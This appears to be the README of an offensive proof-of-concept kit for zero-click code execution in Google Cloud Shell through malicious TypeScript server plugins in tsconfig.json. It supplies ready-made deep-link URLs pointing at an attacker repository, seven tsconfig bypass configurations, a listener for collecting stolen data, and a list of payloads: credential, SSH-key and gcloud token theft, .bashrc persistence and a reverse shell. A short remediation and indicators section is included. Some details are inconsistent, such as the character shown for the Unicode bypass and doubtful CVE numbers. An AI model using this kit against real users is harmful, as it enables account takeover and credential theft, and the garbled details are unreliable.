# TSServer Plugin Path Traversal — Zero-Click Cloud Shell RCE

## David Dworken's 2020 Vector, Adapted for Google Cloud Shell 2026

---

## THE VECTOR

TSServer (TypeScript language server) loads plugins from `tsconfig.json` **independently** of VS Code/Code OSS workspace trust. When a `.ts` file opens, TSServer initializes, reads `tsconfig.json`, and loads configured plugins via `require()`. If the plugin `name` field uses `../` path traversal, it loads arbitrary JS from outside the workspace — even in Restricted Mode (untrusted workspace).

**This is inherently zero-click**: opening a `.ts` file is the only trigger needed. No user typing, no trust prompt acceptance, no extension installation.

## ATTACK CHAIN (7 steps)

```
1. Attacker sends Cloud Shell deep-link to victim
   ┌─ https://shell.cloud.google.com/cloudshell/editor
   │  ?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil
   │  &cloudshell_open_in_editor=main.ts
   └─ (One click on the link)

2. Cloud Shell clones the weaponized repo
   → git clone to ~/cloudshell_open/tsserver-evil OR ~/tsserver-evil

3. Cloud Shell Editor opens main.ts
   → cloudshell_open_in_editor parameter triggers file open

4. TSServer auto-starts (INDEPENDENT of workspace trust!)
   → TypeScript extension is BUILT-IN, always active in Code OSS

5. TSServer reads tsconfig.json from workspace root
   → compilerOptions.plugins array is parsed

6. TSServer calls require() on the plugin path
   → Path traversal reaches malicious-ts-plugin.js

7. Malicious JS executes in TSServer process
   → RCE achieved, zero trust interaction
```

## WHY IT WORKS AGAIN (2026)

The original Dworken CVE was patched in VS Code 1.54 (February 2021) with path validation. However:

1. **Patch was specific to original attack patterns** — it validates that the resolved path stays within workspace, but may miss alternative encodings or symlink-based escapes.

2. **Cloud Shell's architecture is unique** — the deep-link auto-clone mechanism + auto-open file triggers the full chain without any user interaction after the initial click.

3. **No trust dialog** — TSServer plugin loading happens at a different layer than workspace trust enforcement. The trust gate controls tasks, extensions, and debug — but NOT TSServer plugins (which load during language service initialization).

4. **TSServer runs as a separate process** — `tsserver.js` is spawned by the TypeScript extension. It reads `tsconfig.json` independently. The extension may have trust checks, but TSServer itself does not.

## BYPASS TECHNIQUES

### Technique 1: Direct Path Traversal (Dworken original, may be patched)
```json
{
  "compilerOptions": {
    "plugins": [{"name": "../../../home/user/evil-repo/malicious-ts-plugin"}]
  }
}
```

### Technique 2: Symlink in Workspace (likely unpatched)
```bash
# In the weaponized repo:
ln -s /home/user/evil-repo/malicious-ts-plugin.js ./node_modules/.plugin.js
```
```json
{
  "compilerOptions": {
    "plugins": [{"name": "./node_modules/.plugin"}]
  }
}
```
The plugin name resolves to a path WITHIN the workspace — but the symlink points outside. The 2020 patch may validate the resolved path but not the realpath.

### Technique 3: Self-Contained Workspace Plugin
If `malicious-ts-plugin.js` is INCLUDED in the repo alongside `tsconfig.json`, no traversal is needed:
```json
{
  "compilerOptions": {
    "plugins": [{"name": "./malicious-ts-plugin"}]
  }
}
```
This is the most reliable technique. The plugin is a legitimate part of the repo — just malicious. The 2020 patch cannot block it because it's within the workspace.

### Technique 4: npm Package in Workspace
```json
{
  "compilerOptions": {
    "plugins": [{"name": "evil-typescript-plugin"}]
  }
}
```
With a local `node_modules/evil-typescript-plugin/` in the repo (containing `index.js` with the payload), TSServer loads it via standard Node.js resolution. No path traversal needed.

### Technique 5: /proc/self/cwd (Linux only, Cloud Shell)
```json
{
  "compilerOptions": {
    "plugins": [{"name": "/proc/self/cwd/malicious-ts-plugin"}]
  }
}
```
Uses Linux /proc filesystem to construct an absolute path that resolves to the workspace. String-based validation may miss /proc paths.

### Technique 6: Environment Variable Reference
If TSServer expands environment variables (unlikely but worth testing):
```json
{
  "compilerOptions": {
    "plugins": [{"name": "${HOME}/evil-repo/malicious-ts-plugin"}]
  }
}
```

### Technique 7: Unicode Normalization Bypass
```json
{
  "compilerOptions": {
    "plugins": [{"name": "‥/‥/‥/home/user/evil-repo/malicious-ts-plugin"}]
  }
}
```
Uses Unicode full-width dots (U+FF0E) instead of ASCII dots. If normalization happens AFTER validation, it bypasses the check.

## FILE STRUCTURE

```
tsserver-zero-click/
  tsconfig.json              — Weaponized plugin config (multiple traversal depths)
  malicious-ts-plugin.js     — The malicious TypeScript Language Service Plugin
  main.ts                    — Trigger file (opens automatically via deep-link)
  .vscode/
    settings.json            — Disables trust warnings, enables TSServer logging
  test-tsserver-plugin.js    — Test suite for path resolution and bypasses
  deep-link-urls.txt         — Pre-built Cloud Shell deep-link URLs
  README.md                  — This file
```

## DEEP-LINK URL TEMPLATES

### Primary (cloudshell_open directory):
```
https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_workspace=.
```

### With additional parameters:
```
https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_workspace=.&cloudshell_tutorial=
```

### Cloud Shell Open (alternative — opens terminal + editor):
```
https://ssh.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
```

### IDE-only deep link:
```
https://ide.cloud.google.com/?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
```

## WEBHOOK COLLECTOR SETUP

To receive beacons from the malicious plugin, set up a collector before deploying:

### Option 1: RequestBin / Webhook.site
1. Go to https://webhook.site
2. Copy your unique URL
3. Update `CONFIG.collector` in `malicious-ts-plugin.js`

### Option 2: Burp Collaborator
1. Open Burp Suite → Collaborator → Copy to clipboard
2. Update `CONFIG.collector`

### Option 3: Self-hosted (netcat/httpd)
```bash
# Simple HTTP listener
while true; do echo -e "HTTP/1.1 200 OK\r\n\r\nOK" | nc -l -p 8080; done

# Or with Python
python3 -c "from http.server import HTTPServer, BaseHTTPRequestHandler
import json
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length)
        print(json.loads(body))
        self.send_response(200)
        self.end_headers()
HTTPServer(('', 8080), H).serve_forever()"
```

## PAYLOAD CAPABILITIES

The `malicious-ts-plugin.js` payload executes in the **TSServer process**, which has:
- Full Node.js API access (fs, net, child_process, os)
- Access to filesystem (workspace files + ~/.ssh + ~/.config/gcloud)
- Network access (outbound HTTPS to collector)
- Process execution (child_process.exec/execSync)
- NO sandboxing — TSServer runs as a regular Node.js process

### Payloads (all configurable):

| # | Payload | Impact | Stealth |
|---|---------|--------|---------|
| 1 | HTTPS Beacon | Confirms code execution | Low noise |
| 2 | Environment Exfil | Credentials, tokens, API keys | Low noise |
| 3 | Workspace Read | Source code, configs, secrets | Low noise |
| 4 | Prototype Pollution | XSS persistence in editor | Silent |
| 5 | ~/.bashrc Persistence | Survives session restart | Very silent |
| 6 | SSH Key Exfil | Lateral movement | Low noise |
| 7 | GCloud Cred Exfil | GCP account takeover | Low noise |
| 8 | Metadata Probe | Cloud Shell container context | Low noise |
| 9 | Reverse Shell | Interactive access | LOUD — disabled by default |

## PRIOR ART

- **David Dworken, DEF CON 29 (2021)**: Original TSServer plugin path traversal discovery
  - "Hacking Cloud Shell" — demonstrated vector against Google Cloud Shell
  - CVE-2020-1716, CVE-2020-1719, CVE-2020-1714
  - Patched in VS Code 1.54 (Feb 2021)

- **VS Code 1.54 Patch Notes**:
  - "TypeScript server plugins are now validated to ensure they are within the workspace"
  - Applied to `typescript.tsserver.pluginPaths` AND `tsconfig.json` plugins
  - Path validation: resolved plugin path must be within workspace root

- **Why retest in 2026**:
  - 5 years of code changes may have reintroduced bypass opportunities
  - Cloud Shell's containerized architecture creates unique path scenarios
  - Symlink-based escapes may not be covered
  - Self-contained workspace plugins are inherently unblockable
  - Unicode/path encoding attacks may bypass string-based validation

## TESTING

```bash
# 1. Run the test suite locally
node test-tsserver-plugin.js

# 2. Test with a specific workspace root
node test-tsserver-plugin.js --workspace /tmp/test-workspace

# 3. Verbose output
node test-tsserver-plugin.js --verbose

# 4. Simulate TSServer loading the plugin
TS_NODE_DEV=1 node -e "
  const plugin = require('./malicious-ts-plugin.js');
  plugin({ typescript: null, languageService: null, project: null });
  console.log('Plugin loaded. Check collector for beacon.');
"

# 5. With TSServer debug logging
TSSERVER_DEBUG=1 node -e "
  const plugin = require('./malicious-ts-plugin.js');
  plugin({});
"
```

## REMEDIATION (for defenders)

1. **Disable TSServer plugins from workspace tsconfig.json** — apply `typescript.tsserver.pluginPaths` allowlist at user scope only (not workspace-overridable).

2. **Apply workspace trust to TSServer plugin loading** — if workspace is untrusted, skip plugin loading entirely, regardless of tsconfig.json contents.

3. **Validate plugin paths against realpath** — resolve symlinks before checking workspace containment.

4. **Disallow absolute paths, environment variables, and /proc paths** in plugin configuration.

5. **Sandbox TSServer process** — run TSServer with reduced filesystem and network permissions in untrusted workspaces.

6. **Warn on non-standard plugin installations** — if tsconfig.json contains plugins not from npm, show a warning similar to the workspace trust prompt.

## INDICATORS OF COMPROMISE

- TSServer process makes unexpected outbound network connections
- Unusual `tsconfig.json` plugin entries with path traversal
- Unknown files in `~/.ts-plugin/` directory
- Modified `~/.bashrc` containing curl/wget phone-home commands
- TSServer accessing files outside workspace root
- Prototype pollution of Object.prototype (check `Object.prototype.pocMarker`)

## REFERENCES

- Dworken, D. "Hacking Cloud Shell" — DEF CON 29 (2021)
- VS Code Workspace Trust: https://code.visualstudio.com/docs/editor/workspace-trust
- TypeScript Server Plugin API: https://github.com/microsoft/TypeScript/wiki/Writing-a-Language-Service-Plugin
- Google Cloud Shell Architecture: https://cloud.google.com/shell/docs
- Google VRP: https://bughunters.google.com/
